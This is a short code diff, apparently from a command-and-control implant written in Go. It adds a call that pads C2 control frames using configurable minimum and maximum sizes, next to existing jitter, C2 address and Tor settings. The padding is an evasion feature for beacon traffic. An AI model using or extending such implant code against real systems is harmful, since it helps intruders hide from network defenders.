@@ -36,6 +36,9 @@ func InitConfig() (err error) {
 		RuntimeConfig.Jitter = 20
 	}
 
+	// Control-frame padding is a sender-side knob; 0 disables it.
+	transport.SetC2Padding(RuntimeConfig.PaddingMin, RuntimeConfig.PaddingMax)
+
 	// CC Address
 	def.CCAddress = RuntimeConfig.CCAddress
 	isTor := netutil.IsTor(def.CCAddress)
